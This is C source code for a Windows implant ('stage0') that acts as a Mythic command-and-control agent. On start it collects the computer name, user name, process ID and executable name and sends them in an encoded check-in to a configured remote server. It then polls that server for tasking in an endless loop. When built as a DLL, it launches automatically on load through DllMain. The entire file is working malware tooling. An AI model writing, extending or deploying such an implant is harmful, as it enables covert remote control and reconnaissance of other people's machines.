#include "stage0.h"
#include "generated_config.h"
#include <string.h>
#ifdef STAGE0_DEBUG
#include <stdio.h>
#endif

#ifndef STAGE0_TRANSPORT
#define STAGE0_TRANSPORT S0_T_HTTP
#endif

static s0_config g_config = {
    (s0_transport_kind)STAGE0_STAMP_TRANSPORT, STAGE0_STAMP_PORT,
    STAGE0_STAMP_SLEEP, STAGE0_STAMP_JITTER, STAGE0_STAMP_SECURE, 0,
    STAGE0_STAMP_HOST, STAGE0_STAMP_PATH,
    STAGE0_STAMP_PAYLOAD_ID, STAGE0_STAMP_KEY
};

static DWORD WINAPI s0_thread(LPVOID context) {
    s0_agent_run((const s0_config *)context);
    return 0;
}

static int s0_reply_id(const uint8_t *json, uint32_t length, char id[37]) {
    static const char marker[] = "\"id\":\"";
    uint32_t i;
    if (!json || length < sizeof(marker) - 1 + 36) return 0;
    for (i = 0; i + sizeof(marker) - 1 + 36 <= length; ++i) {
        if (memcmp(json + i, marker, sizeof(marker) - 1) == 0) {
            CopyMemory(id, json + i + sizeof(marker) - 1, 36);
            id[36] = 0;
            return 1;
        }
    }
    return 0;
}

int s0_agent_run(const s0_config *cfg) {
    s0_transport t = {0}; s0_buffer tx = {0}, rx = {0}, result = {0};
    s0_buffer plain = {0};
    char callback_id[37], response_id[37], checkin[768];
    char host[256] = {0}, user[256] = {0}, process_path[MAX_PATH] = {0};
    char *process_name = process_path;
    DWORD host_len = sizeof(host), user_len = sizeof(user), process_len;
    int checkin_len;
    s0_debug(L"starting");
    if (!cfg) { s0_debug(L"missing configuration"); return 0; }
#ifdef STAGE0_DEBUG
    fwprintf(stderr, L"[stage0] transport=%u host=%ls port=%u path=%ls secure=%u\n",
             (unsigned)cfg->kind, cfg->host, (unsigned)cfg->port,
             cfg->path, (unsigned)cfg->secure);
#endif
    if (!s0_transport_init(&t, cfg->kind)) {
        s0_debug(L"unsupported transport"); return 0;
    }
    if (!t.open(&t, cfg)) {
        s0_debug_error(L"transport open failed", GetLastError()); return 0;
    }
    s0_debug(L"transport open");
    CopyMemory(callback_id, cfg->payload_id, 37);
    GetComputerNameA(host, &host_len);
    GetUserNameA(user, &user_len);
    process_len = GetModuleFileNameA(0, process_path, sizeof(process_path));
    if (!process_len) process_path[0] = 0;
    else {
        char *cursor = process_path;
        while (*cursor) {
            if (*cursor == '\\' || *cursor == '/') process_name = cursor + 1;
            ++cursor;
        }
    }
    checkin_len = wsprintfA(
        checkin,
        "{\"action\":\"checkin\",\"uuid\":\"%s\",\"user\":\"%s\","
        "\"host\":\"%s\",\"pid\":%lu,\"architecture\":\"x64\","
        "\"process_name\":\"%s\"}",
        cfg->payload_id, user, host, GetCurrentProcessId(), process_name);
    if (checkin_len > 0 &&
        s0_mythic_encode(cfg->payload_id, cfg->key, checkin,
                         (uint32_t)checkin_len, &tx)) {
        s0_debug(L"sending checkin");
        if (!t.exchange(&t, tx.data, tx.length, &rx))
            s0_debug_error(L"checkin exchange failed", GetLastError());
        else if (!s0_mythic_decode(cfg->key, rx.data, rx.length,
                                   response_id, &plain))
            s0_debug(L"checkin response decode failed");
        else if (!s0_reply_id(plain.data, plain.length, callback_id))
            s0_debug(L"checkin response missing callback id");
        else
            s0_debug(L"checkin succeeded");
    }
    for (;;) {
        rx.length = 0;
        plain.length = 0;
        Sleep(cfg->sleep_ms ? cfg->sleep_ms : 1000);
        checkin_len = wsprintfA(checkin,
            "{\"action\":\"get_tasking\",\"tasking_size\":-1,"
            "\"get_delegate_tasks\":true}");
        if (!s0_mythic_encode(callback_id, cfg->key, checkin,
                              (uint32_t)checkin_len, &tx)) break;
        if (!t.exchange(&t, tx.data, tx.length, &rx)) {
            s0_debug_error(L"poll exchange failed", GetLastError()); break;
        }
        if (!s0_mythic_decode(cfg->key, rx.data, rx.length,
                              response_id, &plain)) {
            s0_debug(L"poll response decode failed"); break;
        }
    }
    t.close(&t); s0_buffer_free(&tx); s0_buffer_free(&rx);
    s0_buffer_free(&plain); s0_buffer_free(&result); return 1;
}

__declspec(dllexport) DWORD WINAPI stage0_start(void *config) {
    return (DWORD)s0_agent_run(config ? (const s0_config *)config : &g_config);
}

int main(void) {
    g_config.secure = g_config.kind == S0_T_HTTPS;
    if (g_config.secure && g_config.port == 80) g_config.port = 443;
    return s0_agent_run(&g_config) ? 0 : 1;
}

#ifdef STAGE0_BUILD_DLL
BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
    (void)instance; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(instance);
        CreateThread(0, 0, s0_thread, &g_config, 0, 0);
    }
    return TRUE;
}
#endif
